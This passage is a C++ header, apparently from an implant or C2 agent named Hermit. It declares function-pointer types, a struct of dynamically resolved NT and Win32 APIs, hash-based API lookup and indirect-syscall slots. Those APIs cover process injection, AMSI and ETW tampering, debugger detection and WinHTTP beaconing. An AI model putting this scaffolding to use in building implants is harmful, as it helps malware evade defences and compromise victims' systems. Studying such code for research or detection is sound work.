    typedef BOOL (WINAPI* LPPROC_TERMINATEPROCESS)(HANDLE hProcess, UINT uExitCode);
    // Thread32First
    typedef BOOL (WINAPI* LPPROC_THREAD32FIRST)(HANDLE hSnapshot, LPTHREADENTRY32 lpte);
    // Thread32Next
    typedef BOOL (WINAPI* LPPROC_THREAD32NEXT)(HANDLE hSnapshot, LPTHREADENTRY32 lpte);
    // VirtualAlloc
    typedef LPVOID (WINAPI* LPPROC_VIRTUALALLOC)(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
    // VirtualAllocEx
    typedef LPVOID (WINAPI* LPPROC_VIRTUALALLOCEX)(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
    // VirtualFree
    typedef BOOL (WINAPI* LPPROC_VIRTUALFREE)(LPVOID lpAddress, SIZE_T dwSize, DWORD dwFreeType);
    // VirtualProtect
    typedef BOOL (WINAPI* LPPROC_VIRTUALPROTECT)(LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect);
    // VirtualProtectEx
    typedef BOOL (WINAPI* LPPROC_VIRTUALPROTECTEX)(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect);
    // VirtualQueryEx
    typedef SIZE_T (WINAPI* LPPROC_VIRTUALQUERYEX)(HANDLE hProcess, LPCVOID lpAddress, PMEMORY_BASIC_INFORMATION lpBuffer, SIZE_T dwLength);
    // WinHttpCloseHandle
    typedef BOOL (WINAPI* LPPROC_WINHTTPCLOSEHANDLE)(HINTERNET hInternet);
    // WinHttpConnect
    typedef HINTERNET (WINAPI* LPPROC_WINHTTPCONNECT)(HINTERNET hSession, LPCWSTR pswzServerName, INTERNET_PORT nServerPort, DWORD dwReserved);
    // WinHttpOpen
    typedef HINTERNET (WINAPI* LPPROC_WINHTTPOPEN)(LPCWSTR pszAgentW, DWORD dwAccessType, LPCWSTR pszProxyW, LPCWSTR pszProxyBypassW, DWORD dwFlags);
    // WinHttpOpenRequest
    typedef HINTERNET (WINAPI* LPPROC_WINHTTPOPENREQUEST)(HINTERNET hConnect, LPCWSTR pwszVerb, LPCWSTR pwszObjectName, LPCWSTR pwszVersion, LPCWSTR pwszReferrer, LPCWSTR *ppwszAcceptTypes, DWORD dwFlags);
    // WinHttpQueryDataAvailable
    typedef BOOL (WINAPI* LPPROC_WINHTTPQUERYDATAAVAILABLE)(HINTERNET hRequest, LPDWORD lpdwNumberOfBytesAvailable);
    // WinHttpQueryHeaders
    typedef BOOL (WINAPI* LPPROC_WINHTTPQUERYHEADERS)(HINTERNET hRequest, DWORD dwInfoLevel, LPCWSTR pwszName, LPVOID lpBuffer, LPDWORD lpdwBufferLength, LPDWORD lpdwIndex);
    // WinHttpReadData
    typedef BOOL (WINAPI* LPPROC_WINHTTPREADDATA)(HINTERNET hRequest, LPVOID lpBuffer, DWORD dwNumberOfBytesLength, LPDWORD lpdwNumberOfBytesRead);
    // WinHttpReceiveResponse
    typedef BOOL (WINAPI* LPPROC_WINHTTPRECEIVERESPONSE)(HINTERNET hRequest, LPVOID lpReserved);
    // WinHttpSendRequest
    typedef BOOL (WINAPI* LPPROC_WINHTTPSENDREQUEST)(HINTERNET hRequest, LPCWSTR lpszHeaders, DWORD dwHeadersLength, LPVOID lpOptional, DWORD dwOptionalLength, DWORD dwTotalLength, DWORD_PTR dwContext);
    // WinHttpSetOption
    typedef BOOL (WINAPI* LPPROC_WINHTTPSETOPTION)(HINTERNET hInternet, DWORD dwOption, LPVOID lpBuffer, DWORD dwBufferLength);
    // WinHttpWriteData
    typedef BOOL (WINAPI* LPPROC_WINHTTPWRITEDATA)(HINTERNET hRequest, LPCVOID lpBuffer, DWORD dwNumberOfBytesToWrite, LPDWORD lpdwNumberOfBytesWritten);
    // WriteProcessMemory
    typedef BOOL (WINAPI* LPPROC_WRITEPROCESSMEMORY)(HANDLE hProcess, LPVOID lpBaseAddress, LPCVOID lpBuffer, SIZE_T nSize, SIZE_T *lpNumberOfBytesWritten);
    // WSACleanup
    typedef int (WINAPI* LPPROC_WSACLEANUP)();
    // WSAStartup
    typedef int (WINAPI* LPPROC_WSASTARTUP)(WORD wVersionRequired, LPWSADATA lpWSAData);

    struct PROCS
    {
        // **NTAPI**
        LPPROC_ETWEVENTWRITE                lpEtwEventWrite                     = nullptr;
        LPPROC_LDRLOADDLL                   lpLdrLoadDll                        = nullptr;
        LPPROC_NTALLOCATEVIRTUALMEMORY      lpNtAllocateVirtualMemory           = nullptr;
        LPPROC_NTCLOSE                      lpNtClose                           = nullptr;
        LPPROC_NTCREATEFILE                 lpNtCreateFile                      = nullptr;
        LPPROC_NTCREATENAMEDPIPEFILE        lpNtCreateNamedPipeFile             = nullptr;
        LPPROC_NTCREATEPROCESSEX            lpNtCreateProcessEx                 = nullptr;
        LPPROC_NTCREATESECTION              lpNtCreateSection                   = nullptr;
        LPPROC_NTCREATETHREADEX             lpNtCreateThreadEx                  = nullptr;
        LPPROC_NTDUPLICATEOBJECT            lpNtDuplicateObject                 = nullptr;
        LPPROC_NTFLUSHINSTRUCTIONCACHE      lpNtFlushInstructionCache           = nullptr;
        LPPROC_NTFREEVIRTUALMEMORY          lpNtFreeVirtualMemory               = nullptr;
        LPPROC_NTGETCONTEXTTHREAD           lpNtGetContextThread                = nullptr;
        LPPROC_NTMAPVIEWOFSECTION           lpNtMapViewOfSection                = nullptr;
        LPPROC_NTOPENPROCESS                lpNtOpenProcess                     = nullptr;
        LPPROC_NTOPENPROCESSTOKEN           lpNtOpenProcessToken                = nullptr;
        LPPROC_NTOPENTHREAD                 lpNtOpenThread                      = nullptr;
        LPPROC_NTPROTECTVIRTUALMEMORY       lpNtProtectVirtualMemory            = nullptr;
        LPPROC_NTQUERYINFORMATIONFILE       lpNtQueryInformationFile            = nullptr;
        LPPROC_NTQUERYINFORMATIONPROCESS    lpNtQueryInformationProcess         = nullptr;
        LPPROC_NTQUERYVIRTUALMEMORY         lpNtQueryVirtualMemory              = nullptr;
        LPPROC_NTREADFILE                   lpNtReadFile                        = nullptr;
        LPPROC_NTREADVIRTUALMEMORY          lpNtReadVirtualMemory               = nullptr;
        LPPROC_NTRESUMETHREAD               lpNtResumeThread                    = nullptr;
        LPPROC_NTSETCONTEXTTHREAD           lpNtSetContextThread                = nullptr;
        LPPROC_NTSETINFORMATIONFILE         lpNtSetInformationFile              = nullptr;
        LPPROC_NTSETINFORMATIONPROCESS      lpNtSetInformationProcess           = nullptr;
        LPPROC_NTTERMINATEPROCESS           lpNtTerminateProcess                = nullptr;
        LPPROC_NTUNMAPVIEWOFSECTION         lpNtUnmapViewOfSection              = nullptr;
        LPPROC_NTWAITFORSINGLEOBJECT        lpNtWaitForSingleObject             = nullptr;
        LPPROC_NTWRITEFILE                  lpNtWriteFile                       = nullptr;
        LPPROC_NTWRITEVIRTUALMEMORY         lpNtWriteVirtualMemory              = nullptr;
        LPPROC_RTLALLOCATEHEAP              lpRtlAllocateHeap                   = nullptr;
        LPPROC_RTLCREATEPROCESSREFLECTION   lpRtlCreateProcessReflection        = nullptr;
        LPPROC_RTLCREATEUSERTHREAD          lpRtlCreateUserThread               = nullptr;
        LPPROC_RTLEXPANDENVIRONMENTSTRINGS  lpRtlExpandEnvironmentStrings       = nullptr;
        LPPROC_RTLGETFULLPATHNAME_U         lpRtlGetFullPathName_U              = nullptr;
        LPPROC_RTLINITUNICODESTRING         lpRtlInitUnicodeString              = nullptr;
        LPPROC_RTLQUERYSYSTEMINFORMATION    lpRtlQuerySystemInformation         = nullptr;
        LPPROC_RTLSTRINGCCHCATW             lpRtlStringCchCatW                  = nullptr;
        LPPROC_RTLSTRINGCCHCOPYW            lpRtlStringCchCopyW                 = nullptr;
        LPPROC_RTLSTRINGCCHLENGTHW          lpRtlStringCchLengthW               = nullptr;
        LPPROC_RTLZEROMEMORY                lpRtlZeroMemory                     = nullptr;

        // **WINAPI**
        LPPROC_ADJUSTTOKENPRIVILEGES        lpAdjustTokenPrivileges             = nullptr;
        LPPROC_AMSISCANBUFFER               lpAmsiScanBuffer                    = nullptr;
        LPPROC_BCRYPTCLOSEALGORITHMPROVIDER lpBCryptCloseAlgorithmProvider      = nullptr;
        LPPROC_BCRYPTDECRYPT                lpBCryptDecrypt                     = nullptr;
        LPPROC_BCRYPTDESTROYKEY             lpBCryptDestroyKey                  = nullptr;
        LPPROC_BCRYPTENCRYPT                lpBCryptEncrypt                     = nullptr;
        LPPROC_BCRYPTGENERATESYMMETRICKEY   lpBCryptGenerateSymmetricKey        = nullptr;
        LPPROC_BCRYPTGETPROPERTY            lpBCryptGetProperty                 = nullptr;
        LPPROC_BCRYPTOPENALGORITHMPROVIDER  lpBCryptOpenAlgorithmProvider       = nullptr;
        LPPROC_BCRYPTSETPROPERTY            lpBCryptSetProperty                 = nullptr;
        LPPROC_CHECKREMOTEDEBUGGERPRESENT   lpCheckRemoteDebuggerPresent        = nullptr;
        LPPROC_CLOSEHANDLE                  lpCloseHandle                       = nullptr;
        LPPROC_CONVERTTHREADTOFIBER         lpConvertThreadToFiber              = nullptr;
        LPPROC_CREATEEVENTW                 lpCreateEventW                      = nullptr;
        LPPROC_CREATEFIBER                  lpCreateFiber                       = nullptr;
        LPPROC_CREATEPIPE                   lpCreatePipe                        = nullptr;
        LPPROC_CREATEPROCESSW               lpCreateProcessW                    = nullptr;
        LPPROC_CREATEREMOTETHREADEX         lpCreateRemoteThreadEx              = nullptr;
        LPPROC_CREATETHREADPOOLWAIT         lpCreateThreadpoolWait              = nullptr;
        LPPROC_CREATETOOLHELP32SNAPSHOT     lpCreateToolhelp32Snapshot          = nullptr;
        LPPROC_CRYPTBINARYTOSTRINGW         lpCryptBinaryToStringW              = nullptr;
        LPPROC_CRYPTSTRINGTOBINARYW         lpCryptStringToBinaryW              = nullptr;
        LPPROC_ENUMPROCESSMODULES           lpEnumProcessModules                = nullptr;
        LPPROC_EXPANDENVIRONMENTSTRINGSW    lpExpandEnvironmentStringsW         = nullptr;
        LPPROC_FINDWINDOWW                  lpFindWindowW                       = nullptr;
        LPPROC_FREELIBRARY                  lpFreeLibrary                       = nullptr;
        LPPROC_GETMODULEBASENAMEA           lpGetModuleBaseNameA                = nullptr;
        LPPROC_GETMODULEHANDLEA             lpGetModuleHandleA                  = nullptr;
        LPPROC_GETPROCADDRESS               lpGetProcAddress                    = nullptr;
        LPPROC_GETSYSTEMDIRECTORYW          lpGetSystemDirectoryW               = nullptr;
        LPPROC_GETSYSTEMINFO                lpGetSystemInfo                     = nullptr;
        LPPROC_GETTHREADCONTEXT             lpGetThreadContext                  = nullptr;
        LPPROC_GETWINDOWTHREADPROCESSID     lpGetWindowThreadProcessId          = nullptr;
        LPPROC_IMAGENTHEADER                lpImageNtHeader                     = nullptr;
        LPPROC_ISDEBUGGERPRESENT            lpIsDebuggerPresent                 = nullptr;
        LPPROC_LOADLIBRARYA                 lpLoadLibraryA                      = nullptr;
        LPPROC_LOADLIBRARYW                 lpLoadLibraryW                      = nullptr;
        LPPROC_LOOKUPPRIVILEGEVALUEW        lpLookupPrivilegeValueW             = nullptr;
        LPPROC_MESSAGEBOXA                  lpMessageBoxA                       = nullptr;
        LPPROC_MESSAGEBOXW                  lpMessageBoxW                       = nullptr;
        LPPROC_OPENPROCESS                  lpOpenProcess                       = nullptr;
        LPPROC_OPENPROCESSTOKEN             lpOpenProcessToken                  = nullptr;
        LPPROC_OPENTHREAD                   lpOpenThread                        = nullptr;
        LPPROC_PROCESS32FIRSTW              lpProcess32FirstW                   = nullptr;
        LPPROC_PROCESS32NEXTW               lpProcess32NextW                    = nullptr;
        LPPROC_QUEUEUSERAPC                 lpQueueUserAPC                      = nullptr;
        LPPROC_READFILE                     lpReadFile                          = nullptr;
        LPPROC_READPROCESSMEMORY            lpReadProcessMemory                 = nullptr;
        LPPROC_RESUMETHREAD                 lpResumeThread                      = nullptr;
        LPPROC_SETHANDLEINFORMATION         lpSetHandleInformation              = nullptr;
        LPPROC_SETTHREADCONTEXT             lpSetThreadContext                  = nullptr;
        LPPROC_SETTHREADPOOLWAIT            lpSetThreadpoolWait                 = nullptr;
        LPPROC_SUSPENDTHREAD                lpSuspendThread                     = nullptr;
        LPPROC_SWITCHTOFIBER                lpSwitchToFiber                     = nullptr;
        LPPROC_TERMINATEPROCESS             lpTerminateProcess                  = nullptr;
        LPPROC_THREAD32FIRST                lpThread32First                     = nullptr;
        LPPROC_THREAD32NEXT                 lpThread32Next                      = nullptr;
        LPPROC_VIRTUALALLOC                 lpVirtualAlloc                      = nullptr;
        LPPROC_VIRTUALALLOCEX               lpVirtualAllocEx                    = nullptr;
        LPPROC_VIRTUALFREE                  lpVirtualFree                       = nullptr;
        LPPROC_VIRTUALPROTECT               lpVirtualProtect                    = nullptr;
        LPPROC_VIRTUALPROTECTEX             lpVirtualProtectEx                  = nullptr;
        LPPROC_VIRTUALQUERYEX               lpVirtualQueryEx                    = nullptr;
        LPPROC_WINHTTPCLOSEHANDLE           lpWinHttpCloseHandle                = nullptr;
        LPPROC_WINHTTPCONNECT               lpWinHttpConnect                    = nullptr;
        LPPROC_WINHTTPOPEN                  lpWinHttpOpen                       = nullptr;
        LPPROC_WINHTTPOPENREQUEST           lpWinHttpOpenRequest                = nullptr;
        LPPROC_WINHTTPQUERYDATAAVAILABLE    lpWinHttpQueryDataAvailable         = nullptr;
        LPPROC_WINHTTPQUERYHEADERS          lpWinHttpQueryHeaders               = nullptr;
        LPPROC_WINHTTPREADDATA              lpWinHttpReadData                   = nullptr;
        LPPROC_WINHTTPRECEIVERESPONSE       lpWinHttpReceiveResponse            = nullptr;
        LPPROC_WINHTTPSENDREQUEST           lpWinHttpSendRequest                = nullptr;
        LPPROC_WINHTTPSETOPTION             lpWinHttpSetOption                  = nullptr;
        LPPROC_WINHTTPWRITEDATA             lpWinHttpWriteData                  = nullptr;
        LPPROC_WRITEPROCESSMEMORY           lpWriteProcessMemory                = nullptr;
        LPPROC_WSACLEANUP                   lpWSACleanup                        = nullptr;
        LPPROC_WSASTARTUP                   lpWSAStartup                        = nullptr;

        // **SYSCALLS**
        Syscalls::SYSCALL                   sysEtwEventWrite                    = {0};
        Syscalls::SYSCALL                   sysLdrLoadDll                       = {0};
        Syscalls::SYSCALL                   sysNtAllocateVirtualMemory          = {0};
        Syscalls::SYSCALL                   sysNtClose                          = {0};
        Syscalls::SYSCALL                   sysNtCreateFile                     = {0};
        Syscalls::SYSCALL                   sysNtCreateProcessEx                = {0};
        Syscalls::SYSCALL                   sysNtCreateSection                  = {0};
        Syscalls::SYSCALL                   sysNtCreateThreadEx                 = {0};
        Syscalls::SYSCALL                   sysNtFlushInstructionCache          = {0};
        Syscalls::SYSCALL                   sysNtFreeVirtualMemory              = {0};
        Syscalls::SYSCALL                   sysNtGetContextThread               = {0};
        Syscalls::SYSCALL                   sysNtMapViewOfSection               = {0};
        Syscalls::SYSCALL                   sysNtOpenProcess                    = {0};
        Syscalls::SYSCALL                   sysNtOpenProcessToken               = {0};
        Syscalls::SYSCALL                   sysNtOpenThread                     = {0};
        Syscalls::SYSCALL                   sysNtProtectVirtualMemory           = {0};
        Syscalls::SYSCALL                   sysNtQueryInformationFile           = {0};
        Syscalls::SYSCALL                   sysNtQueryInformationProcess        = {0};
        Syscalls::SYSCALL                   sysNtQueryVirtualMemory             = {0};
        Syscalls::SYSCALL                   sysNtReadFile                       = {0};
        Syscalls::SYSCALL                   sysNtReadVirtualMemory              = {0};
        Syscalls::SYSCALL                   sysNtResumeThread                   = {0};
        Syscalls::SYSCALL                   sysNtSetContextThread               = {0};
        Syscalls::SYSCALL                   sysNtSetInformationProcess          = {0};
        Syscalls::SYSCALL                   sysNtTerminateProcess               = {0};
        Syscalls::SYSCALL                   sysNtUnmapViewOfSection             = {0};
        Syscalls::SYSCALL                   sysNtWaitForSingleObject            = {0};
        Syscalls::SYSCALL                   sysNtWriteFile                      = {0};
        Syscalls::SYSCALL                   sysNtWriteVirtualMemory             = {0};
        Syscalls::SYSCALL                   sysRtlCreateProcessReflection       = {0};
        Syscalls::SYSCALL                   sysRtlCreateUserThread              = {0};
        Syscalls::SYSCALL                   sysRtlGetFullPathName_U             = {0};
        Syscalls::SYSCALL                   sysRtlInitUnicodeString             = {0};
    };

    typedef PROCS* PPROCS;

    DWORD StringToHashFunc(char* str);
    PVOID GetProcAddressByHash(
        HMODULE hModule,
        DWORD   dwHash
    );
    VOID FindProcs(
        Procs::PPROCS pProcs,
        HMODULE hNtdll,
        HMODULE hKernel32,
        BOOL bIndirectSyscalls
    );
    VOID FindProcsMisc(
        Procs::PPROCS pProcs,
        HMODULE hAdvapi32,
        HMODULE hAmsi,
        HMODULE hBcrypt,
        HMODULE hCrypt32,
        HMODULE hDbghelp,
        HMODULE hUser32,
        HMODULE hWinHttp,
        HMODULE hWs2_32
    );
}

#endif // HERMIT_CORE_PROCS_HPP